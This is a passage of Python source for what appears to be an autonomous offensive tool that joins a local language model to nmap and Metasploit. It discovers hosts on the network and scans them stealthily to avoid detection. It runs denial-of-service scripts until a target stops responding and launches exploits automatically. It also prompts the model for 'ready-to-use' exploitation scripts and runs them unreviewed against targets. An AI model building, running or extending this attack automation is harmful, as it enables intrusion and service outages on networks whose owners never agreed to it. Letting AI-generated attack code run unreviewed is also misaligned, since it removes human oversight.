            self.logger.info("Using nmap scripts for DoS testing")
            dos_scripts = [
                "http-slowloris",
                "smb-dos",
                "ipv6-ra-flood", 
                "dns-flood"
            ]
            
            for script in dos_scripts:
                script_cmd = f"nmap -Pn -p- --script={script} {target}"
                if self.stealth:
                    script_cmd += " -T2"
                
                self.logger.info(f"Running DoS script: {script}")
                self.viewer.status(f"Testing vulnerability to {script} attack...")
                
                try:
                    process = subprocess.Popen(
                        script_cmd.split(),
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    # Let it run for a few seconds before checking target status
                    time.sleep(5)
                    
                    # Check if target is still responding
                    if not self.network_discovery.ping_host(target):
                        self.logger.info(f"Target {target} is now unreachable - DoS appears successful")
                        self.viewer.dos_attack_summary(target, True, script)
                        
                        # Terminate the process as we've achieved the goal
                        process.terminate()
                        return True
                    
                    # If still up after 10 seconds, let it run up to 30 seconds total
                    time.sleep(25)
                    process.terminate()
                    
                    # Final check if target is still responding
                    if not self.network_discovery.ping_host(target):
                        self.logger.info(f"Target {target} is now unreachable after extended attack")
                        self.viewer.dos_attack_summary(target, True, script)
                        return True
                        
                except Exception as e:
                    self.logger.error(f"Error during DoS attack with {script}: {str(e)}")
                    
            # If we get here, none of the scripts worked
            self.logger.warning(f"All DoS attacks failed to take down {target}")
            self.viewer.dos_attack_summary(target, False)
            
            # If custom scripts are enabled, try generating a DoS script
            if self.custom_scripts:
                self.logger.info("Attempting to generate a custom DoS script")
                self.viewer.status("Generating custom DoS script...")
                
                script_path = self.generate_custom_script(
                    script_type=self.script_type,
                    target_info={"target": target, "purpose": "dos_attack"}
                )
                
                if script_path and self.execute_scripts:
                    self.logger.info(f"Executing custom DoS script: {script_path}")
                    self.viewer.status(f"Executing custom DoS script...")
                    
                    success = self.execute_generated_script(script_path, [target])
                    
                    # Check if target is still up after custom script
                    if not self.network_discovery.ping_host(target):
                        self.logger.info(f"Target {target} is now unreachable after custom DoS script")
                        self.viewer.dos_attack_summary(target, True, "Custom Script")
                        return True
            
            return False
                
        except Exception as e:
            self.logger.error(f"Error performing DoS attack: {str(e)}")
            self.logger.debug(traceback.format_exc())
            self.viewer.error(f"Error performing DoS attack: {str(e)}")
            return False

    def generate_custom_script(self, script_type="bash", target_info=None):
        """
        Generate a custom script based on scan results using Ollama
        
        Args:
            script_type (str): Type of script to generate (bash, python, ruby)
            target_info (dict): Target information to use for script generation
            
        Returns:
            str: Path to the generated script
        """
        if not self.custom_scripts:
            self.logger.warning("Custom script generation is disabled")
            return None
            
        self.logger.info(f"Generating custom {script_type} script based on scan results")
        self.viewer.status(f"Generating custom {script_type} script...")
        
        # Use target_info if provided, otherwise use the current target
        if target_info is None:
            current_target = self.target
            target_info = self.summarize_results(self.run_nmap_scan(self.generate_scan_parameters(1)))
        
        # Prepare data for the model
        scan_summary = json.dumps(target_info, indent=2)
        
        # Construct the prompt
        prompt = f"""
        You are a cybersecurity expert writing custom scripts for reconnaissance and analysis.
        
        Based on the following scan results, create a useful {script_type} script that could help a security professional
        analyze this system further or extract more information. Include detailed comments and a clear summary at the beginning.
        Make sure to start the script with a clear description of what it does in a comment section titled "SCRIPT SUMMARY".
        
        Scan Results:
        {scan_summary}
        
        Create a complete, ready-to-use {script_type} script that is useful for further analysis or exploitation.
        """
        
        try:
            # Prepare model
            self.logger.debug(f"Calling Ollama model: {self.ollama_model}")
            
            # Get script content from Ollama
            script_content = self.call_ollama(prompt)
            
            if not script_content:
                self.logger.error("Failed to generate script content")
                self.viewer.error("Failed to generate script content")
                return None
                
            # Extract code block if present
            code_pattern = r"```(?:\w+)?\s*([\s\S]*?)```"
            code_match = re.search(code_pattern, script_content)
            if code_match:
                script_content = code_match.group(1).strip()
            
            # Create output directory if it doesn't exist
            os.makedirs("generated_scripts", exist_ok=True)
            
            # Determine file extension
            extension = {
                "bash": "sh",
                "python": "py",
                "ruby": "rb"
            }.get(script_type.lower(), "txt")
            
            # Generate a filename
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            target_str = self.target.replace('.', '_').replace(':', '_')
            script_filename = f"generated_scripts/{script_type}_{target_str}_{timestamp}.{extension}"
            
            # Write the script to file
            with open(script_filename, "w") as f:
                f.write(script_content)
            
            # Make the script executable
            if script_type.lower() != "python":
                os.chmod(script_filename, os.stat(script_filename).st_mode | stat.S_IEXEC)
            
            self.logger.info(f"Custom script generated: {script_filename}")
            
            # Extract summary from the script
            summary_pattern = r"SCRIPT SUMMARY[:\s]*(.*?)(?:\n\n|\n#|\n$)"
            summary_match = re.search(summary_pattern, script_content, re.IGNORECASE | re.DOTALL)
            
            summary = "No summary available"
            if summary_match:
                summary = summary_match.group(1).strip()
                # Clean up the summary (remove comment marks and extra whitespace)
                summary = re.sub(r'^#\s*', '', summary, flags=re.MULTILINE)
                summary = re.sub(r'\n\s*#\s*', ' ', summary)
                summary = re.sub(r'\s+', ' ', summary).strip()
            
            # Display summary to console using the viewer
            self.viewer.script_generation_summary(script_filename, script_type, summary)
            
            return script_filename
        except Exception as e:
            self.logger.error(f"Error generating custom script: {str(e)}")
            self.logger.debug(traceback.format_exc())
            self.viewer.error(f"Error generating custom script: {str(e)}")
            return None

    def execute_generated_script(self, script_path, args=None):
        """
        Execute a generated script
        
        Args:
            script_path (str): Path to the script to execute
            args (list): Optional arguments to pass to the script
            
        Returns:
            bool: True if successful, False otherwise
        """
        if not self.execute_scripts:
            self.logger.warning("Script execution is disabled")
            return False
            
        if not script_path or not os.path.exists(script_path):
            self.logger.error(f"Script not found: {script_path}")
            return False
            
        try:
            # Determine how to execute based on file extension
            extension = os.path.splitext(script_path)[1].lower()
            
            cmd = []
            if extension == '.py':
                cmd = ['python3', script_path]
            elif extension in ['.sh', '.bash']:
                cmd = ['bash', script_path]
            elif extension == '.rb':
                cmd = ['ruby', script_path]
            else:
                # Default to direct execution if it's executable
                cmd = [script_path]
                
            # Add any arguments
            if args:
                if isinstance(args, list):
                    cmd.extend(args)
                else:
                    cmd.append(str(args))
            
            # Execute the script
            self.logger.info(f"Executing script: {' '.join(cmd)}")
            self.viewer.status(f"Executing script: {os.path.basename(script_path)}")
            
            # Set up process
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1
            )
            
            # Collect output
            output_lines = []
            for line in process.stdout:
                output_lines.append(line.rstrip())
                self.logger.debug(f"Script output: {line.strip()}")
                
            # Get return code
            return_code = process.wait()
            
            # Get stderr output
            stderr_output = process.stderr.read()
            if stderr_output:
                output_lines.append("\nERROR OUTPUT:")
                output_lines.append(stderr_output)
                self.logger.warning(f"Script error output: {stderr_output}")
            
            # Display execution summary
            self.viewer.script_execution_summary(
                script_path, 
                return_code, 
                "\n".join(output_lines)
            )
            
            return return_code == 0
            
        except Exception as e:
            self.logger.error(f"Error executing script: {str(e)}")
            self.logger.debug(traceback.format_exc())
            self.viewer.error(f"Error executing script: {str(e)}")
            return False

    def run(self):
        """Start the adaptive scanning process."""
        try:
            # Display start banner
            scan_type = "Full-Auto" if self.continuous else f"Limited ({self.max_iterations} iterations)"
            self.viewer.display_start_banner(self.target or "Auto-discovery", scan_type, self.ollama_model)
            
            # Check if system has enough resources for Ollama
            if HAS_PSUTIL:
                mem_gb = psutil.virtual_memory().total / (1024 * 1024 * 1024)
                if mem_gb < 8:
                    self.viewer.warning(f"System has only {mem_gb:.1f}GB RAM. Ollama may be slow or unresponsive.")
                    self.viewer.warning("Consider using a smaller model or increasing system resources.")
            
            # Set up Metasploit if enabled
            if self.msf_integration:
                animation = self.viewer.scanning_animation("Setting up Metasploit...", duration=2)
                self.setup_metasploit()
                animation.set()
            
            # If auto-discovery enabled, try to find targets first
            if self.auto_discover and self.network_discovery:
                logger.info("Starting network discovery")
                if not self.target:
                    discovered_hosts = self.network_discovery.discover_hosts()
                    if not discovered_hosts:
                        logger.error("No hosts discovered. Please check your network connection or specify a target.")
                        return
                    
                    logger.info(f"Discovered {len(discovered_hosts)} hosts: {', '.join(discovered_hosts)}")
                    self.target = discovered_hosts[0]  # Start with the first host
                    self.discovered_hosts = discovered_hosts
                    
                    logger.info(f"Selected initial target: {self.target}")
                else:
                    # User specified a target but still wants auto-discovery
                    self.discovered_hosts = self.network_discovery.discover_hosts()
                    logger.info(f"User-specified target: {self.target}")
                    if self.discovered_hosts:
                        logger.info(f"Also discovered {len(self.discovered_hosts)} additional hosts")
                        # Add user target if not in the list
                        if self.target not in self.discovered_hosts:
                            self.discovered_hosts.append(self.target)
            
            # Log startup information
            logger.info(f"Starting adaptive Nmap scan against {self.target}")
            logger.info(f"Using Ollama model: {self.ollama_model}")
            logger.info(f"Delay between scans: {self.delay} seconds")
            
            if self.continuous:
                logger.info("Running in continuous mode. Press Ctrl+C to stop.")
            else:
                logger.info(f"Maximum iterations: {self.max_iterations}")
                
            if self.msf_integration:
                logger.info("Metasploit integration: ENABLED")
                if self.exploit:
                    logger.info("Automatic exploitation: ENABLED")
                if self.auto_script:
                    logger.info("Auto script generation: ENABLED")
                    
            if self.stealth:
                logger.info("Stealth mode: ENABLED")
            
            # Begin adaptive scanning process
            iteration = 1
            scripts_generated = 0
            
            should_continue = True
            while should_continue and self.running:
                # Check if we've reached the maximum iterations
                if not self.continuous and iteration > self.max_iterations:
                    self.logger.info(f"Reached maximum iterations ({self.max_iterations}). Stopping.")
                    should_continue = False
                else:
                    self.viewer.header(f"SCAN ITERATION {iteration}: {self.target}", "=")
                    
                    # Generate scan parameters
                    scan_params = self.generate_scan_parameters(iteration)
                    
                    # Show scanning animation
                    scan_message = f"Running scan iteration {iteration}/{self.max_iterations if not self.continuous else '∞'}"
                    animation = self.viewer.scanning_animation(scan_message, duration=15)
                    
                    # Run the scan
                    result = self.run_nmap_scan(scan_params)
                    
                    # Stop animation
                    animation.set()
                    
                    if result:
                        # Update scan history
                        self.scan_history.append({
                            "iteration": iteration,
                            "target": self.target,
                            "params": scan_params,
                            "result_summary": self.summarize_results(result)
                        })
                        
                        # Process results with Metasploit if enabled
                        if self.msf_integration:
                            self.process_results_with_metasploit(result)
                            
                            if self.exploit:
                                self.run_exploits_on_host(self.target)
                    
                    # Run Metasploit exploits if enabled
                    if self.msf_integration and self.exploit and should_continue:
                        self.run_exploits_on_host(self.target)
                    
                    # Perform DoS attack if enabled
                    if self.dos_attack and should_continue:
                        self.perform_dos_attack(self.target)
                    
                    # Generate custom scripts if enabled
                    scripts_generated = len(self.generated_scripts)
                    if self.custom_scripts and iteration >= 2 and scripts_generated < 3:
                        self.logger.info(f"Generating custom {self.script_type} script based on scan results...")
                        
                        # Generate script
                        script_path = self.generate_custom_script(script_type=self.script_type)
                        
                        if script_path:
                            # Add to our list of generated scripts
                            self.generated_scripts.append(script_path)
                            
                            # Execute the script if enabled
                            if self.execute_scripts:
                                self.logger.info(f"Executing generated script: {script_path}")
                                self.viewer.status(f"Executing generated script...")
                                self.execute_generated_script(script_path, [self.target])
                            else:
                                self.logger.info(f"Script generated but not executed. To run: {script_path} {self.target}")
                
                    iteration += 1
                    
                    # Check again before waiting to avoid unnecessary delay
                    if not self.continuous and iteration > self.max_iterations:
                        logger.info(f"Reached maximum iterations ({self.max_iterations}). Stopping.")
                        should_continue = False
                    else:
                        logger.info(f"Waiting {self.delay} seconds before next scan...")
                        time.sleep(self.delay)
            
        except KeyboardInterrupt:
            self.logger.info("\nScan interrupted by user. Exiting...")
            self.viewer.warning("Scan interrupted by user. Exiting...")
        except Exception as e:
            self.logger.error(f"Error during scan: {str(e)}")
            self.logger.debug(traceback.format_exc())
            self.viewer.error(f"Error during scan: {str(e)}")
        finally:
            # Show summary of generated scripts
            if self.custom_scripts and self.generated_scripts:
                self.logger.info(f"\nGenerated {len(self.generated_scripts)} scripts:")
                summary = []
                summary.append(f"Total Scripts: {len(self.generated_scripts)}")
                for script in self.generated_scripts:
                    summary.append(f"  - {script}")
                self.viewer.result_box("GENERATED SCRIPTS SUMMARY", "\n".join(summary))
            
            # Clean up resources
            if self.metasploit:
                try:
                    self.metasploit.disconnect()
                    logger.info("Disconnected from Metasploit")
                except:
                    pass

    def determine_best_script_type(self):
        """Determine the best script type based on discovered services."""
        if not self.discovered_services:
            return "bash"  # Default to bash if no services discovered
        
        # Count service types
        web_services = 0
        database_services = 0
        windows_services = 0
        
        for port_key, service_info in self.discovered_services.items():
            service = service_info.get('service', '').lower()
            
            if service in ['http', 'https', 'www', 'apache', 'nginx', 'iis', 'tomcat']:
                web_services += 1
            elif service in ['mysql', 'postgresql', 'mssql', 'oracle', 'db2']:
                database_services += 1
            elif service in ['smb', 'microsoft-ds', 'netbios', 'ldap', 'kerberos']:
                windows_services += 1
        
        # Choose script type based on discovered services
        if web_services > database_services and web_services > windows_services:
            return "python"  # Python is good for web services
        elif database_services > web_services and database_services > windows_services:
            return "ruby"    # Ruby for database services (like in Metasploit)
        else:
            return "bash"    # Bash for general purpose or Windows services

    def generate_scan_parameters(self, iteration):
        """Generate scan parameters based on current iteration and history."""
        # For first iteration, use basic or stealth scan
        if iteration == 1:
            if self.stealth:
                # Use stealthy scan parameters to avoid detection
                return [
                    "-sS",                 # SYN scan
                    "-T2",                 # Timing template (2 = "polite")
                    "--data-length=15",    # Add random data to packets
                    "--randomize-hosts",   # Scan hosts in random order
                    "--max-retries=1",     # Limit retry attempts
                    "--scan-delay=0.5s",   # Add delay between probes
                    "--min-rate=10",       # Limit packet rate
                    "--reason",            # Show reason for service state
                    "-p-",                 # Scan all ports
                    self.target            # Target IP/host
                ]
            else:
                # Regular initial scan
                return [
                    "-sS",                 # SYN scan
                    "-T4",                 # Timing template (4 = "aggressive")
                    "--min-rate=1000",     # Minimum packet rate
                    "-p-",                 # All ports
                    "--open",              # Only show open ports
                    self.target            # Target IP/host
                ]
        
        # For subsequent iterations, consult with Ollama
        if not self.scan_history:
            # Fallback if somehow we don't have history
            return self.generate_scan_parameters(1)
        
        # Prepare context for Ollama based on scan history
        context = self.prepare_ollama_context()
        
        # Get next scan strategy from Ollama
        prompt = f"""Given the previous Nmap scan results, recommend the next optimal Nmap scan parameters for a {iteration}{'st' if iteration == 1 else 'nd' if iteration == 2 else 'rd' if iteration == 3 else 'th'} iteration scan against {self.target}.

Previous scan information:
{context}

Provide ONLY the Nmap command line parameters (without 'nmap' prefix) for the next scan to gain more information about the target, discover services and potential vulnerabilities.
{'Use stealthy techniques to avoid detection.' if self.stealth else ''}
"""

        # Get response from Ollama
        logger.info("Asking Ollama for next scan strategy...")
        response = self.call_ollama(prompt)
        
        if not response:
            logger.warning("Failed to get response from Ollama, using default parameters")
            # Use a default strategy based on iteration
            if iteration == 2:
                # Service detection on discovered ports
                open_ports = self.get_open_ports_from_history()
                port_spec = f"-p {open_ports}" if open_ports else "-p-"
                return ["-sV", "-O", "--version-all", port_spec, self.target]
            else:
                # Vulnerability scan
                return ["-sV", "-O", "--script=vuln", "--version-all", self.target]
        
        # Parse Ollama response to get Nmap parameters
        scan_params = self.parse_ollama_response(response)
        
        # Make sure we always have the target at the end
        if self.target not in scan_params:
            scan_params.append(self.target)
        
        logger.info(f"Generated scan parameters: {' '.join(scan_params)}")
        return scan_params

    def run_nmap_scan(self, scan_params):
        """Run an Nmap scan with the given parameters and return the result."""
        try:
            self.logger.info(f"Running Nmap scan with parameters: {' '.join(scan_params)}")
            self.viewer.status(f"Running Nmap scan against {self.target}")
            
            # Remove target from params as nmap_scan() expects it separately
            params = [p for p in scan_params if p != self.target]
            target = self.target
            
            # Initialize nmap scanner
            nm = nmap.PortScanner()
            
            # Execute scan with parameters
            self.logger.debug(f"Executing: nmap {' '.join(params)} {target}")
            
            # Start time for progress estimation
            start_time = time.time()
            estimated_duration = 60  # Default estimated scan time in seconds
            
            # Start scan in a separate thread so we can update progress bar
            scan_completed = threading.Event()
            scan_result = [None]
            
            def run_scan():
                try:
                    scan_result[0] = nm.scan(hosts=target, arguments=' '.join(params))
                finally:
                    scan_completed.set()
            
            scan_thread = threading.Thread(target=run_scan)
            scan_thread.start()
            
            # Show progress bar while scanning
            while not scan_completed.is_set():
                elapsed = time.time() - start_time
                progress = min(elapsed / estimated_duration, 0.99)  # Cap at 99% until complete
                self.viewer.progress_bar(
                    current=int(progress * 100),
                    total=100,
                    prefix=f'Scanning {target}:',
                    suffix=f'Elapsed: {int(elapsed)}s'
                )
                time.sleep(0.5)
            
            # Ensure the thread is done
            scan_thread.join()
            
            # Final progress update
            self.viewer.progress_bar(
                current=100,
                total=100,
                prefix=f'Scanning {target}:',
                suffix=f'Complete in {int(time.time() - start_time)}s'
            )
            
            result = scan_result[0]
            
            if target in nm.all_hosts():
                host_info = nm[target]
                tcp_count = len(host_info.get('tcp', {}))
                udp_count = len(host_info.get('udp', {}))
                self.logger.info(f"Scan completed: {tcp_count} TCP ports and {udp_count} UDP ports found")
                
                # Display scan summary
                self.viewer.scan_summary(target, result)
                
                return result
            else:
                self.logger.warning(f"No results found for target {target}")
                self.viewer.warning(f"No results found for target {target}")
                return None
            
        except nmap.PortScannerError as e:
            self.logger.error(f"Nmap scan error: {str(e)}")
            self.viewer.error(f"Nmap scan error: {str(e)}")
            return None
        except Exception as e:
            self.logger.error(f"Error during Nmap scan: {str(e)}")
            self.logger.debug(traceback.format_exc())
            self.viewer.error(f"Error during Nmap scan: {str(e)}")
            return None

    def summarize_results(self, result):
        """Create a summary of the scan results for history."""
        if not result or 'scan' not in result:
            return "No results"
        
        target = self.target
        if target not in result['scan']:
            return "Target not found in results"
        
        host_data = result['scan'][target]
        
        summary = {
            "hostname": host_data.get('hostnames', [{'name': 'unknown'}])[0]['name'],
            "state": host_data.get('status', {}).get('state', 'unknown'),
            "open_ports": {}
        }
        
        # Collect TCP ports
        if 'tcp' in host_data:
            for port, port_data in host_data['tcp'].items():
                if port_data['state'] == 'open':
                    summary['open_ports'][f"{port}/tcp"] = {
                        "service": port_data.get('name', 'unknown'),
                        "product": port_data.get('product', ''),
                        "version": port_data.get('version', '')
                    }
        
        # Collect UDP ports
        if 'udp' in host_data:
            for port, port_data in host_data['udp'].items():
                if port_data['state'] == 'open':
                    summary['open_ports'][f"{port}/udp"] = {
                        "service": port_data.get('name', 'unknown'),
                        "product": port_data.get('product', ''),
                        "version": port_data.get('version', '')
                    }
        
        return summary

    def prepare_ollama_context(self):
        """Prepare context from scan history for Ollama."""
        if not self.scan_history:
            return "No previous scan data available."
        
        context = []
        for i, scan in enumerate(self.scan_history[-3:]):  # Use at most the last 3 scans
            params = scan.get('params', [])
            summary = scan.get('result_summary', {})
            
            context.append(f"Scan {i+1}: Parameters: {' '.join(params)}")
            
            if isinstance(summary, dict) and 'open_ports' in summary:
                ports_info = []
                for port_key, port_data in summary['open_ports'].items():
                    service_version = f"{port_data['service']} {port_data['product']} {port_data['version']}".strip()
                    ports_info.append(f"{port_key}: {service_version}")
                
                if ports_info:
                    context.append(f"Results: Found {len(ports_info)} open ports:")
                    context.extend([f"  - {info}" for info in ports_info])
                else:
                    context.append("Results: No open ports found")
            else:
                context.append(f"Results: {summary}")
        
        return "\n".join(context)

    def call_ollama(self, prompt):
        """
        Call the Ollama API to generate a response
        
        Args:
            prompt (str): The prompt to send to Ollama
            
        Returns:
            str: The generated response
        """
        try:
            # Check if Ollama process is running
            if os.name == 'posix':  # Unix/Linux
                ollama_running = subprocess.run(["pgrep", "ollama"], stdout=subprocess.PIPE).returncode == 0
            else:  # Windows and others
                ollama_running = "ollama" in subprocess.run(["tasklist"], stdout=subprocess.PIPE, text=True).stdout.lower()
                
            if not ollama_running:
                self.logger.warning("Ollama process not detected, service may not be running")
                self.viewer.warning("Ollama service not detected - scanning may be limited")
            
            # Configure API timeout based on available system memory
            timeout = 60  # Default timeout
            if HAS_PSUTIL:
                total_mem = psutil.virtual_memory().total / (1024 * 1024 * 1024)  # GB
                if total_mem < 12:  # Less than 12GB RAM
                    timeout = 120  # Longer timeout for systems with less RAM
                    self.logger.info(f"Limited system memory detected ({total_mem:.1f}GB), increasing Ollama timeout to {timeout}s")
            
            ollama_url = f"http://localhost:11434/api/generate"
            payload = {
                "model": self.ollama_model,
                "prompt": prompt,
                "stream": False
            }
            
            self.logger.debug(f"Calling Ollama API with model: {self.ollama_model}")
            self.viewer.status(f"Getting AI recommendations using {self.ollama_model}...")
            
            response = requests.post(ollama_url, json=payload, timeout=timeout)
            
            if response.status_code == 200:
                result = response.json()
                return result.get("response", "")
            else:
                self.logger.error(f"Ollama API error: {response.status_code} - {response.text}")
                return ""
                
        except requests.exceptions.Timeout:
            self.logger.error(f"Ollama API request timed out after {timeout}s. This may be due to limited system resources.")
            self.viewer.warning(f"Ollama timeout - try with a smaller model or increase system resources")
            return ""
        except requests.exceptions.ConnectionError:
            self.logger.error("Failed to connect to Ollama API. Make sure Ollama is running.")
            self.viewer.error("Cannot connect to Ollama service. Check if it's running with 'pgrep ollama'")
            return ""
        except Exception as e:
            self.logger.error(f"Error calling Ollama: {str(e)}")
            self.logger.debug(traceback.format_exc())
            return ""

    def parse_ollama_response(self, response):
        """Parse Ollama response to extract Nmap parameters."""
        if not response:
            return []
        
        # Clean up the response
        lines = response.strip().split('\n')
        
        # Look for lines that start with nmap or -
        for line in lines:
            line = line.strip()
            if line.startswith('nmap '):
                # Remove 'nmap ' prefix and split into parameters
                return line[5:].split()
            elif line.startswith('-') and ' ' in line:
                # This looks like Nmap parameters, split it
                return line.split()
        
        # Fallback: just return all non-empty lines joined and split by spaces
        all_text = ' '.join([l.strip() for l in lines if l.strip()])
        return all_text.split()

    def get_open_ports_from_history(self):
        """Get a comma-separated list of open ports from scan history."""
        if not self.scan_history:
            return ""
        
        open_ports = set()
        
        for scan in self.scan_history:
            summary = scan.get('result_summary', {})
            if isinstance(summary, dict) and 'open_ports' in summary:
                for port_key in summary['open_ports'].keys():
                    port = port_key.split('/')[0]  # Extract port number from "port/protocol"
                    open_ports.add(port)
        
        return ','.join(sorted(open_ports, key=int)) if open_ports else ""

def main():
    parser = argparse.ArgumentParser(description="Adaptive Nmap scanner with Ollama and Metasploit integration")
    # Optional target
    parser.add_argument("target", nargs="?", help="Target IP address or hostname (optional if --auto-discover is used)")
    parser.add_argument("--model", default="qwen2.5-coder:7b",
                        help="Ollama model to use (default: qwen2.5-coder:7b, alternatives: llama3)")
    parser.add_argument("--iterations", type=int, default=3, help="Maximum number of scan iterations (default: 3)")
    parser.add_argument("--continuous", action="store_true", help="Run in continuous mode until manually stopped")
    parser.add_argument("--delay", type=int, default=2, help="Delay in seconds between scans (default: 2)")
    parser.add_argument("--msf", action="store_true", help="Enable Metasploit integration")
    parser.add_argument("--exploit", action="store_true", help="Automatically attempt exploitation using Metasploit")
    parser.add_argument("--workspace", default="adaptive_scan", help="Metasploit workspace name (default: adaptive_scan)")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode for scans to avoid detection")
    parser.add_argument("--auto-script", action="store_true", help="Auto-generate and run Metasploit resource scripts")
    parser.add_argument("--dos", action="store_true", help="Attempt Denial of Service attacks against target hosts")
    parser.add_argument("--full-auto", action="store_true", help="Full autonomous mode (implies --continuous --msf --exploit --auto-script)")
    parser.add_argument("--quiet", action="store_true", help="Reduce verbosity of output")
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")
    
    # Network discovery options
    parser.add_argument("--auto-discover", action="store_true", help="Automatically discover network and hosts")
    parser.add_argument("--interface", help="Network interface to use for discovery")
    parser.add_argument("--scan-all", action="store_true", help="Scan all discovered hosts (implies --auto-discover)")
    parser.add_argument("--network", help="Specific network to scan in CIDR notation (e.g., 192.168.1.0/24)")
    parser.add_argument("--host-timeout", type=int, default=1, help="Timeout in seconds for host discovery (default: 1)")
    
    # Script generation options
    parser.add_argument("--custom-scripts", action="store_true", help="Enable AI-powered custom script generation")
    parser.add_argument("--script-type", choices=["bash", "python", "ruby"], default="bash", 
                        help="Type of custom script to generate (default: bash)")
    parser.add_argument("--execute-scripts", action="store_true", 
                        help="Automatically execute generated scripts (use with caution)")
    
    # Version information
    parser.add_argument("--version", action="store_true", help="Show version information and exit")
    
    args = parser.parse_args()
    
    # Display version if requested
    if args.version:
        print("AI_MAL Adaptive Nmap Scanner version 1.0.0")
        print("Copyright (c) 2024")
        sys.exit(0)
    
    # Set logging level
    if args.debug:
        logger.setLevel(logging.DEBUG)
    elif args.quiet:
        logger.setLevel(logging.WARNING)
    
    # Full auto mode implications
    if args.full_auto:
        args.continuous = True
        args.msf = True
        args.exploit = True
        args.auto_script = True
        args.custom_scripts = True
    
    # Network discovery implications
    if args.scan_all:
        args.auto_discover = True
    
    # Check if we have a target or auto-discover
    if not args.target and not args.auto_discover:
        logger.error("Error: Either a target must be specified or --auto-discover must be enabled")
        parser.print_help()
        sys.exit(1)
    
    # Initialize scanner with appropriate options
    scanner = AdaptiveNmapScanner(
        target=args.target,
        ollama_model=args.model,
        max_iterations=args.iterations,
        continuous=args.continuous,
        delay=args.delay,
        msf_integration=args.msf,
        exploit=args.exploit,
        msf_workspace=args.workspace,
        stealth=args.stealth,
        auto_script=args.auto_script,
        quiet=args.quiet,
        debug=args.debug,
        auto_discover=args.auto_discover,
        interface=args.interface,
        scan_all=args.scan_all,
        network=args.network,
        host_timeout=args.host_timeout,
        custom_scripts=args.custom_scripts,
        script_type=args.script_type,
        execute_scripts=args.execute_scripts,
        dos_attack=args.dos
    )
    
    # Additional setup for network option
    if args.network and scanner.network_discovery:
        scanner.network_discovery.network = args.network
        logger.info(f"Using specified network: {args.network}")
    
    # Start scanning
    scanner.run()

if __name__ == "__main__":
    main() 